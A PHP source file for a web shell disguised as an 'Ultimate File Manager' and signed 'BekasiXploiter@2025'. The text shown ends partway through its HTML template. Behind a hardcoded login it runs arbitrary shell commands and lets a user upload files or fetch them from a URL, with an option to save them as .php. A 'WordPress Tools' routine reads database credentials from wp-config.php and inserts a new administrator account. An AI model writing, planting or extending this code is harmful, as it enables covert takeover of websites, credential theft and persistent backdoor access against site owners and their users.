<?php
// ultimate_manager.php - Ultimate File Manager with CMD & WordPress Tools
session_start();

// Login Configuration
$valid_username = 'admin';
$valid_password_hash = md5('44e86618f574c1b5a643f9cfdd38b50c');

// Check if user is logged in
if (!isset($_SESSION['ultimate_logged_in'])) {
    if ($_POST['login'] ?? false) {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        if ($username === $valid_username && md5($password) === $valid_password_hash) {
            $_SESSION['ultimate_logged_in'] = true;
            $_SESSION['username'] = $username;
        } else {
            $login_error = "Invalid username or password!";
        }
    }
    
    if (!isset($_SESSION['ultimate_logged_in'])) {
        displayLoginForm($login_error ?? '');
        exit;
    }
}

// Logout
if ($_GET['logout'] ?? false) {
    session_destroy();
    header('Location: fm.php');
    exit;
}

// Main functionality
$base_dir = realpath('.');
$current_dir = $_GET['dir'] ?? '';

// Handle directory navigation - FIX BREADCRUMB ISSUE
if ($current_dir) {
    // Decode URL encoded directory
    $current_dir = urldecode($current_dir);
    $current_path = $base_dir . DIRECTORY_SEPARATOR . $current_dir;
    
    // Security: Prevent directory traversal
    if (strpos(realpath($current_path), $base_dir) !== 0) {
        $current_path = $base_dir;
        $current_dir = '';
    }
} else {
    $current_path = $base_dir;
    $current_dir = '';
}

// Handle actions
handleActions($current_path);

// Get current tab
$current_tab = $_GET['tab'] ?? 'filemanager';

// Display the main interface
displayMainInterface($current_path, $current_tab, $base_dir);

// ===== FUNCTIONS =====

function displayLoginForm($error = '') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ultimate Manager - Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                color: white;
            }
            .login-container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0,0,0,0.2);
                width: 90%;
                max-width: 400px;
                border: 1px solid rgba(255,255,255,0.2);
                animation: slideUp 0.8s ease;
            }
            @keyframes slideUp {
                from { opacity: 0; transform: translateY(30px); }
                to { opacity: 1; transform: translateY(0); }
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            .login-header h1 {
                font-size: 2.2rem;
                margin-bottom: 10px;
                background: linear-gradient(45deg, #fff, #e2e8f0);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .login-header p {
                color: #e2e8f0;
                opacity: 0.9;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #e2e8f0;
                font-weight: 500;
            }
            .form-group input {
                width: 100%;
                padding: 15px;
                background: rgba(255,255,255,0.1);
                border: 1px solid rgba(255,255,255,0.3);
                border-radius: 10px;
                color: white;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            .form-group input:focus {
                outline: none;
                border-color: #60a5fa;
                box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.3);
                background: rgba(255,255,255,0.15);
            }
            .form-group input::placeholder {
                color: #cbd5e1;
            }
            .submit-btn {
                width: 100%;
                padding: 15px;
                background: linear-gradient(45deg, #667eea, #764ba2);
                border: none;
                border-radius: 10px;
                color: white;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            .submit-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
            }
            .error {
                color: #fecaca;
                text-align: center;
                margin-bottom: 15px;
                padding: 12px;
                background: rgba(220, 38, 38, 0.3);
                border-radius: 8px;
                border: 1px solid rgba(248, 113, 113, 0.5);
                animation: shake 0.5s ease;
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
            .login-info {
                text-align: center;
                margin-top: 20px;
                color: #e2e8f0;
                font-size: 14px;
                opacity: 0.8;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Ultimate Manager</h1>
                <p>All-in-one file management tool</p>
            </div>
            
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <form method="POST">
                <input type="hidden" name="login" value="1">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" value="admin" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter password" required>
                </div>
                <button type="submit" class="submit-btn">Login to Dashboard</button>
            </form>
            
            <div class="login-info">
                BekasiXploiter@2025
            </div>
        </div>
    </body>
    </html>
    <?php
}

function handleActions($current_path) {
    if ($_POST['action'] ?? false) {
        $action = $_POST['action'];
        $target = $_POST['target'] ?? '';
        $new_name = $_POST['new_name'] ?? '';
        
        $target_path = $current_path . DIRECTORY_SEPARATOR . $target;
        
        switch ($action) {
            case 'delete':
                if (is_dir($target_path)) {
                    deleteDirectory($target_path);
                } else {
                    unlink($target_path);
                }
                break;
                
            case 'rename':
                $new_path = $current_path . DIRECTORY_SEPARATOR . $new_name;
                if (file_exists($target_path) && !file_exists($new_path)) {
                    rename($target_path, $new_path);
                }
                break;
                
            case 'chmod':
                $mode = octdec($_POST['mode']);
                if (file_exists($target_path)) {
                    chmod($target_path, $mode);
                }
                break;
                
            case 'edit':
                $content = $_POST['content'] ?? '';
                if (is_file($target_path) && is_writable($target_path)) {
                    file_put_contents($target_path, $content);
                }
                break;
                
            case 'create_dir':
                $new_dir_path = $current_path . DIRECTORY_SEPARATOR . $new_name;
                if (!file_exists($new_dir_path)) {
                    mkdir($new_dir_path, 0755, true);
                }
                break;
                
            case 'create_file':
                $new_file_path = $current_path . DIRECTORY_SEPARATOR . $new_name;
                $file_content = $_POST['file_content'] ?? '';
                if (!file_exists($new_file_path)) {
                    file_put_contents($new_file_path, $file_content);
                }
                break;
                
            case 'upload_file':
                if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
                    $fileName = basename($_FILES['file_upload']['name']);
                    $fileTmp = $_FILES['file_upload']['tmp_name'];
                    $addPhpExt = isset($_POST['add_php_ext']);
                    $autoUnzip = isset($_POST['auto_unzip']);
                    
                    if ($addPhpExt) {
                        $fileInfo = pathinfo($fileName);
                        $fileName = $fileInfo['filename'] . '.php';
                    }
                    
                    $targetFile = $current_path . DIRECTORY_SEPARATOR . $fileName;
                    
                    if (file_exists($targetFile)) {
                        $fileName = time() . '_' . $fileName;
                        $targetFile = $current_path . DIRECTORY_SEPARATOR . $fileName;
                    }
                    
                    if (move_uploaded_file($fileTmp, $targetFile)) {
                        if ($autoUnzip && mime_content_type($targetFile) === 'application/zip') {
                            $zip = new ZipArchive();
                            if ($zip->open($targetFile) === TRUE) {
                                $extractPath = $current_path . DIRECTORY_SEPARATOR . pathinfo($fileName, PATHINFO_FILENAME);
                                if (!is_dir($extractPath)) {
                                    mkdir($extractPath, 0755, true);
                                }
                                $zip->extractTo($extractPath);
                                $zip->close();
                            }
                        }
                    }
                }
                break;
                
            case 'download_url':
                $fileUrl = $_POST['file_url'] ?? '';
                $addPhpExt = isset($_POST['add_php_ext_link']);
                $autoUnzip = isset($_POST['auto_unzip_link']);
                
                if (!empty($fileUrl) && filter_var($fileUrl, FILTER_VALIDATE_URL)) {
                    $fileName = basename(parse_url($fileUrl, PHP_URL_PATH));
                    if (empty($fileName)) $fileName = 'downloaded_file_' . time();
                    
                    if ($addPhpExt) {
                        $fileInfo = pathinfo($fileName);
                        $fileName = $fileInfo['filename'] . '.php';
                    }
                    
                    $targetFile = $current_path . DIRECTORY_SEPARATOR . $fileName;
                    $fileContent = file_get_contents($fileUrl);
                    
                    if ($fileContent !== false && file_put_contents($targetFile, $fileContent) !== false) {
                        if ($autoUnzip && mime_content_type($targetFile) === 'application/zip') {
                            $zip = new ZipArchive();
                            if ($zip->open($targetFile) === TRUE) {
                                $extractPath = $current_path . DIRECTORY_SEPARATOR . pathinfo($fileName, PATHINFO_FILENAME);
                                if (!is_dir($extractPath)) {
                                    mkdir($extractPath, 0755, true);
                                }
                                $zip->extractTo($extractPath);
                                $zip->close();
                            }
                        }
                    }
                }
                break;
                
            case 'wp_add_admin':
                $wp_config_path = $_POST['wp_config_path'] ?? '';
                $username = $_POST['wp_username'] ?? '';
                $password = $_POST['wp_password'] ?? '';
                $email = $_POST['wp_email'] ?? '';
                
                if ($wp_config_path && $username && $password && $email) {
                    addWordPressAdmin($wp_config_path, $username, $password, $email);
                }
                break;
        }
        
        header('Location: ' . getCurrentUrl());
        exit;
    }
    
    // Handle command execution
    if ($_POST['command'] ?? false) {
        $command = $_POST['command'];
        $output = '';
        
        if (!empty($command)) {
            if (function_exists('shell_exec')) {
                $output = shell_exec($command . ' 2>&1');
            } else if (function_exists('exec')) {
                exec($command . ' 2>&1', $outputArray, $returnCode);
                $output = implode("\n", $outputArray);
            }
            
            if (empty($output) && $output !== '0') {
                $output = "Command executed successfully but no output returned";
            }
        }
        
        echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
        exit;
    }
    
    // Handle file content reading for editing
    if ($_GET['action'] === 'get_content' && isset($_GET['file'])) {
        $file_path = $current_path . DIRECTORY_SEPARATOR . $_GET['file'];
        if (is_file($file_path) && is_readable($file_path)) {
            echo file_get_contents($file_path);
        }
        exit;
    }
    
    // Handle file download
    if ($_GET['download'] ?? false) {
        $file_path = $current_path . DIRECTORY_SEPARATOR . $_GET['download'];
        if (is_file($file_path) && is_readable($file_path)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
            header('Content-Length: ' . filesize($file_path));
            readfile($file_path);
            exit;
        }
    }
}

function addWordPressAdmin($wp_config_path, $username, $password, $email) {
    if (!file_exists($wp_config_path)) {
        return "WordPress config file not found!";
    }
    
    // Read wp-config.php to get database credentials
    $wp_config_content = file_get_contents($wp_config_path);
    
    // Extract DB credentials using regex
    preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_name);
    preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_user);
    preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_pass);
    preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_host);
    
    if (empty($db_name[1]) || empty($db_user[1]) || empty($db_pass[1])) {
        return "Could not extract database credentials from wp-config.php";
    }
    
    $db_host = $db_host[1] ?? 'localhost';
    
    try {
        // Connect to database
        $conn = new mysqli($db_host, $db_user[1], $db_pass[1], $db_name[1]);
        
        if ($conn->connect_error) {
            return "Database connection failed: " . $conn->connect_error;
        }
        
        // Create password hash
        $password_hash = wp_hash_password($password);
        
        // Insert new admin user
        $user_login = $conn->real_escape_string($username);
        $user_pass = $conn->real_escape_string($password_hash);
        $user_email = $conn->real_escape_string($email);
        $user_nicename = $conn->real_escape_string(strtolower($username));
        $user_registered = date('Y-m-d H:i:s');
        $display_name = $conn->real_escape_string($username);
        
        $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) 
                VALUES ('$user_login', '$user_pass', '$user_nicename', '$user_email', '$user_registered', '$display_name')";
        
        if ($conn->query($sql) === TRUE) {
            $user_id = $conn->insert_id;
            
            // Add admin capabilities
            $sql_meta = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES 
                        ($user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'),
                        ($user_id, 'wp_user_level', '10')";
            
            if ($conn->query($sql_meta) === TRUE) {
                return "WordPress admin user '$username' created successfully!";
            } else {
                return "User created but failed to set admin capabilities: " . $conn->error;
            }
        } else {
            return "Failed to create user: " . $conn->error;
        }
        
        $conn->close();
        
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

function wp_hash_password($password) {
    return md5($password);
}

function getDirectoryContents($path) {
    $items = [];
    
    if (!is_dir($path)) return $items;
    
    // Add parent directory link
    if ($path !== realpath('.')) {
        $parent_path = dirname($path);
        $relative_parent = getRelativePath($parent_path);
        $items[] = [
            'name' => '..',
            'type' => 'parent',
            'path' => $relative_parent,
            'size' => 0,
            'perms' => '',
            'modified' => 0
        ];
    }
    
    $files = scandir($path);
    $dirs = [];
    $files_list = [];
    
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        
        $full_path = $path . DIRECTORY_SEPARATOR . $file;
        $relative_path = getRelativePath($full_path);
        
        $item = [
            'name' => $file,
            'type' => is_dir($full_path) ? 'dir' : 'file',
            'path' => $relative_path,
            'size' => is_file($full_path) ? filesize($full_path) : 0,
            'perms' => getPermissions($full_path),
            'modified' => filemtime($full_path),
            'extension' => pathinfo($file, PATHINFO_EXTENSION)
        ];
        
        if ($item['type'] === 'dir') {
            $dirs[] = $item;
        } else {
            $files_list[] = $item;
        }
    }
    
    // Natural sort
    usort($dirs, function($a, $b) {
        return strnatcasecmp($a['name'], $b['name']);
    });
    
    usort($files_list, function($a, $b) {
        return strnatcasecmp($a['name'], $b['name']);
    });
    
    return array_merge($dirs, $files_list);
}

function getRelativePath($full_path) {
    $base_dir = realpath('.');
    $relative_path = str_replace($base_dir . DIRECTORY_SEPARATOR, '', $full_path);
    return $relative_path === $base_dir ? '' : $relative_path;
}

function getPermissions($path) {
    $perms = fileperms($path);
    $info = '';
    $info .= (($perms & 0x4000) ? 'd' : '-');
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) return;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        is_dir($path) ? deleteDirectory($path) : unlink($path);
    }
    rmdir($dir);
}

function getCurrentUrl() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];
    return $protocol . "://" . $host . $uri;
}

function getBreadcrumbs($current_dir, $base_dir) {
    if (empty($current_dir)) return [];
    
    $parts = explode(DIRECTORY_SEPARATOR, $current_dir);
    $breadcrumbs = [];
    $current_path = '';
    
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= $current_path ? DIRECTORY_SEPARATOR . $part : $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $current_path];
    }
    
    return $breadcrumbs;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    else return $bytes . ' B';
}

function displayMainInterface($current_path, $current_tab, $base_dir) {
    $items = getDirectoryContents($current_path);
    $current_relative_dir = getRelativePath($current_path);
    $breadcrumbs = getBreadcrumbs($current_relative_dir, $base_dir);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ultimate Manager</title>
        <style>
            :root {
                --primary: #667eea;
                --secondary: #764ba2;
                --dark: #1a202c;
                --light: #f7fafc;
                --success: #48bb78;
                --danger: #f56565;
                --warning: #ed8936;
                --info: #4299e1;
            }
            
            * { 
                margin: 0; 
                padding: 0; 
                box-sizing: border-box; 
            }
            
            body {
                background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                color: var(--dark);
                min-height: 100vh;
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }
            
            .header {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                border-radius: 15px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                border: 1px solid rgba(255,255,255,0.3);
                animation: slideDown 0.6s ease;
            }
            
            @keyframes slideDown {
                from { opacity: 0; transform: translateY(-20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            .header-top {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 15px;
                flex-wrap: wrap;
                gap: 15px;
            }
            
            .header h1 {
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                font-size: 2.2rem;
            }
            
            .user-info {
                display: flex;
                align-items: center;
                gap: 15px;
                flex-wrap: wrap;
            }
            
            .btn {
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                text-decoration: none;
                cursor: pointer;
                transition: all 0.3s ease;
                font-weight: 600;
                display: inline-flex;
                align-items: center;
                gap: 8px;
            }
            
            .btn-primary { background: var(--primary); color: white; }
            .btn-danger { background: var(--danger); color: white; }
            .btn-success { background: var(--success); color: white; }
            .btn-warning { background: var(--warning); color: white; }
            .btn-info { background: var(--info); color: white; }
            
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }
            
            .breadcrumb {
                background: rgba(255,255,255,0.8);
                padding: 12px 20px;
                border-radius: 10px;
                font-size: 0.9rem;
            }
            
            .breadcrumb a {
                color: var(--primary);
                text-decoration: none;
                transition: color 0.3s ease;
            }
            
            .breadcrumb a:hover {
                color: var(--secondary);
                text-decoration: underline;
            }
            
            .tabs {
                display: flex;
                background: rgba(255,255,255,0.9);
                border-radius: 10px;
                padding: 5px;
                margin-bottom: 20px;
                overflow-x: auto;
                gap: 5px;
            }
            
            .tab-btn {
                padding: 12px 20px;
                border: none;
                background: transparent;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.3s ease;
                white-space: nowrap;
                display: flex;
                align-items: center;
                gap: 8px;
                font-weight: 500;
            }
            
            .tab-btn.active {
                background: var(--primary);
                color: white;
                box-shadow: 0 2px 10px rgba(102, 126, 234, 0.3);
            }
            
            .tab-content {
                display: none;
                animation: fadeIn 0.5s ease;
            }
            
            .tab-content.active {
                display: block;
            }
            
            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            
            .card {
                background: rgba(255, 255, 255, 0.95);
                border-radius: 15px;
                padding: 25px;
                margin-bottom: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                border: 1px solid rgba(255,255,255,0.3);
                backdrop-filter: blur(10px);
            }
            
            .file-list {
                background: rgba(255, 255, 255, 0.95);
                border-radius: 15px;
                overflow: hidden;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            }
            
            .file-header {
                display: grid;
                grid-template-columns: 40px 1fr 100px 120px 200px 150px;
                gap: 15px;
                padding: 15px;
                align-items: center;
                border-bottom: 1px solid #e2e8f0;
                background: #f7fafc;
                font-weight: 600;
                color: #4a5568;
            }
            
            .file-item {
                display: grid;
                grid-template-columns: 40px 1fr 100px 120px 200px 150px;
                gap: 15px;
                padding: 15px;
                align-items: center;
                border-bottom: 1px solid #e2e8f0;
                transition: background 0.3s ease;
                position: relative;
                overflow: hidden;
            }
            
            .file-item:hover {
                background: #f7fafc;
            }
            
            .file-item:last-child {
                border-bottom: none;
            }
            
            .icon { text-align: center; font-size: 1.2rem; }
            .name { word-break: break-all; }
            .name a { color: var(--dark); text-decoration: none; display: block; padding: 5px 0; }
            .name a:hover { color: var(--primary); }
            .size, .perms, .modified { font-family: 'Courier New', monospace; font-size: 0.9rem; color: #718096; }
            
            .actions {
                display: flex;
                gap: 5px;
                flex-wrap: wrap;
            }
            
            .action-btn {
                padding: 6px 10px;
                border: none;
                border-radius: 5px;
                font-size: 0.8rem;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .action-btn.edit { background: var(--info); color: white; }
            .action-btn.delete { background: var(--danger); color: white; }
            .action-btn.download { background: var(--success); color: white; }
            
            /* Mobile Swipe Actions */
            .file-item-mobile {
                display: none;
                padding: 15px;
                border-bottom: 1px solid #e2e8f0;
                background: white;
                position: relative;
                overflow: hidden;
                touch-action: pan-y;
            }
            
            .file-content {
                display: flex;
                align-items: center;
                gap: 15px;
                transition: transform 0.3s ease;
                width: 100%;
            }
            
            .file-info {
                flex: 1;
                min-width: 0;
            }
            
            .file-name {
                font-weight: 500;
                margin-bottom: 5px;
                word-break: break-all;
            }
            
            .file-details {
                display: flex;
                gap: 15px;
                font-size: 0.8rem;
                color: #718096;
            }
            
            .mobile-actions {
                display: flex;
                gap: 5px;
                position: absolute;
                right: 15px;
                top: 50%;
                transform: translateY(-50%);
                transition: transform 0.3s ease;
            }
            
            .mobile-action-btn {
                padding: 8px 12px;
                border: none;
                border-radius: 5px;
                font-size: 0.8rem;
                cursor: pointer;
                white-space: nowrap;
            }
            
            .terminal {
                background: #1a202c;
                border-radius: 10px;
                overflow: hidden;
                color: white;
            }
            
            .terminal-header {
                background: #2d3748;
                padding: 15px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .terminal-body {
                padding: 20px;
                height: 400px;
                overflow-y: auto;
            }
            
            .output-line {
                margin-bottom: 5px;
                font-family: 'Courier New', monospace;
                line-height: 1.4;
            }
            
            .prompt { color: var(--success); font-weight: bold; }
            .command-input-container {
                display: flex;
                align-items: center;
                background: #2d3748;
                padding: 15px;
                border-top: 1px solid #4a5568;
            }
            
            .command-input {
                flex: 1;
                background: transparent;
                border: none;
                color: white;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                outline: none;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                color: #4a5568;
            }
            
            .form-group input, .form-group textarea, .form-group select {
                width: 100%;
                padding: 12px;
                border: 1px solid #e2e8f0;
                border-radius: 8px;
                font-size: 14px;
                transition: all 0.3s ease;
            }
            
            .form-group input:focus, .form-group textarea:focus {
                outline: none;
                border-color: var(--primary);
                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            }
            
            .checkbox-group {
                display: flex;
                align-items: center;
                gap: 10px;
                margin-bottom: 15px;
            }
            
            .checkbox-group input[type="checkbox"] {
                width: 18px;
                height: 18px;
                accent-color: var(--primary);
            }
            
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                z-index: 1000;
                justify-content: center;
                align-items: center;
                animation: fadeIn 0.3s ease;
            }
            
            .modal-content {
                background: white;
                padding: 30px;
                border-radius: 15px;
                width: 90%;
                max-width: 600px;
                max-height: 80vh;
                overflow-y: auto;
                animation: scaleIn 0.3s ease;
            }
            
            @keyframes scaleIn {
                from { opacity: 0; transform: scale(0.9); }
                to { opacity: 1; transform: scale(1); }
            }
            
            .modal-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }
            
            .modal-header h3 {
                color: var(--primary);
            }
            
            .close-btn {
                background: none;
                border: none;
                font-size: 1.5rem;
                cursor: pointer;
                color: #718096;
            }
            
            .empty-state {
                text-align: center;
                padding: 40px;
                color: #718096;
            }
            
            /* Mobile Responsive */
            @media (max-width: 768px) {
                .container { padding: 10px; }
                .header-top { flex-direction: column; align-items: flex-start; }
                
                /* Hide desktop view, show mobile view */
                .file-header, .file-item { display: none; }
                .file-item-mobile { display: block; }
                
                .tabs { overflow-x: auto; }
                .tab-btn { padding: 10px 15px; font-size: 0.9rem; }
                
                .file-content {
                    padding-right: 120px; /* Space for actions */
                }
                
                .mobile-actions {
                    transform: translateX(100%) translateY(-50%);
                }
                
                .file-item-mobile.swiped .mobile-actions {
                    transform: translateX(0) translateY(-50%);
                }
                
                .file-item-mobile.swiped .file-content {
                    transform: translateX(-100px);
                }
            }
            
            /* Desktop view */
            @media (min-width: 769px) {
                .file-item-mobile { display: none; }
                .file-header, .file-item { display: grid; }
            }
            
            .loading {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid #f3f3f3;
                border-top: 3px solid var(--primary);
                border-radius: 50%;
                animation: spin 1s linear infinite;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            .message {
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
                animation: slideInRight 0.5s ease;
            }
            
            .message.success { background: #c6f6d5; color: #22543d; border: 1px solid #9ae6b4; }
            .message.error { background: #fed7d7; color: #742a2a; border: 1px solid #feb2b2; }
            .message.warning { background: #feebc8; color: #744210; border: 1px solid #fbd38d; }
            
            @keyframes slideInRight {
                from { opacity: 0; transform: translateX(30px); }
                to { opacity: 1; transform: translateX(0); }
            }

            .file-icon { color: #4299e1; }
            .folder-icon { color: #ed8936; }
            .parent-icon { color: #718096; }
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Header -->
            <div class="header">
                <div class="header-top">
                    <h1>Ultimate Manager</h1>
                    <div class="user-info">
                        <span>Welcome, <?php echo $_SESSION['username']; ?></span>
                        <a href="?logout=1" class="btn btn-danger">Logout</a>
                    </div>
                </div>
                
                <div class="breadcrumb">
                    Path: 
                    <a href="?tab=<?php echo $current_tab; ?>&dir=">root</a>
                    <?php foreach ($breadcrumbs as $crumb): ?>
                        / <a href="?tab=<?php echo $current_tab; ?>&dir=<?php echo urlencode($crumb['path']); ?>">
                            <?php echo htmlspecialchars($crumb['name']); ?>
                        </a>
                    <?php endforeach; ?>
                    <div style="color: #718096; font-size: 0.8rem; margin-top: 5px;">
                        Current: <?php echo htmlspecialchars($current_path); ?>
                    </div>
                </div>
            </div>
            
            <!-- Tabs -->
            <div class="tabs">
                <button class="tab-btn <?php echo $current_tab === 'filemanager' ? 'active' : ''; ?>" 
                        onclick="switchTab('filemanager')">
                    File Manager
                </button>
                <button class="tab-btn <?php echo $current_tab === 'upload' ? 'active' : ''; ?>" 
                        onclick="switchTab('upload')">
                    Upload
                </button>
                <button class="tab-btn <?php echo $current_tab === 'cmd' ? 'active' : ''; ?>" 
                        onclick="switchTab('cmd')">
                    Terminal
                </button>
                <button class="tab-btn <?php echo $current_tab === 'wordpress' ? 'active' : ''; ?>" 
                        onclick="switchTab('wordpress')">
                    WordPress Tools
                </button>
            </div>
            
            <!-- File Manager Tab -->
            <div id="filemanager" class="tab-content <?php echo $current_tab === 'filemanager' ? 'active' : ''; ?>">
                <div class="card">
                    <div style="display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;">
                        <button class="btn btn-primary" onclick="showModal('create-dir-modal')">
                            New Folder
                        </button>
                        <button class="btn btn-success" onclick="showModal('create-file-modal')">
                            New File
                        </button>
                    </div>
                    
                    <div class="file-list">
                        <!-- Desktop View -->
                        <div class="file-header">
                            <div class="icon"></div>
                            <div>Name</div>
                            <div>Size</div>
                            <div>Permissions</div>
                            <div>Modified</div>
                            <div>Actions</div>
                        </div>
                        
                        <?php if (empty($items)): ?>
                            <div class="empty-state">Folder is empty</div>
                        <?php else: ?>
                            <!-- Desktop Items -->
                            <?php foreach ($items as $item): ?>
                                <div class="file-item">
                                    <div class="icon">
                                        <?php if ($item['type'] === 'parent'): ?>
                                            <span class="parent-icon">↩</span>
                                        <?php elseif ($item['type'] === 'dir'): ?>
                                            <span class="folder-icon">📁</span>
                                        <?php else: ?>
                                            <span class="file-icon">📄</span>
                                        <?php endif; ?>
                                    </div>
                                    <div class="name">
                                        <?php if ($item['type'] === 'dir' || $item['type'] === 'parent'): ?>
                                            <a href="?tab=filemanager&dir=<?php echo urlencode($item['path']); ?>">
                                                <?php echo htmlspecialchars($item['name']); ?>
                                            </a>
                                        <?php else: ?>
                                            <a href="?tab=filemanager&dir=<?php echo urlencode($current_relative_dir); ?>&view=<?php echo urlencode($item['name']); ?>">
                                                <?php echo htmlspecialchars($item['name']); ?>
                                            </a>
                                        <?php endif; ?>
                                    </div>
                                    <div class="size">
                                        <?php if ($item['type'] === 'file'): ?>
                                            <?php echo formatSize($item['size']); ?>
                                        <?php endif; ?>
                                    </div>
                                    <div class="perms"><?php echo $item['perms']; ?></div>
                                    <div class="modified"><?php echo date('Y-m-d H:i:s', $item['modified']); ?></div>
                                    <div class="actions">
                                        <?php if ($item['type'] === 'file'): ?>
                                            <button class="action-btn edit" onclick="editFile('<?php echo urlencode($item['name']); ?>')">
                                                Edit
                                            </button>
                                            <button class="action-btn download" onclick="downloadFile('<?php echo urlencode($item['name']); ?>')">
                                                Download
                                            </button>
                                        <?php endif; ?>
                                        
                                        <?php if ($item['name'] !== '..'): ?>
                                            <button class="action-btn" onclick="renameItem('<?php echo urlencode($item['name']); ?>')">
                                                Rename
                                            </button>
                                            <button class="action-btn delete" onclick="deleteItem('<?php echo urlencode($item['name']); ?>', '<?php echo $item['type']; ?>')">
                                                Delete
                                            </button>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                
                                <!-- Mobile Item -->
                                <div class="file-item-mobile" data-name="<?php echo htmlspecialchars($item['name']); ?>" data-type="<?php echo $item['type']; ?>">
                                    <div class="file-content">
                                        <div class="icon">
                                            <?php if ($item['type'] === 'parent'): ?>
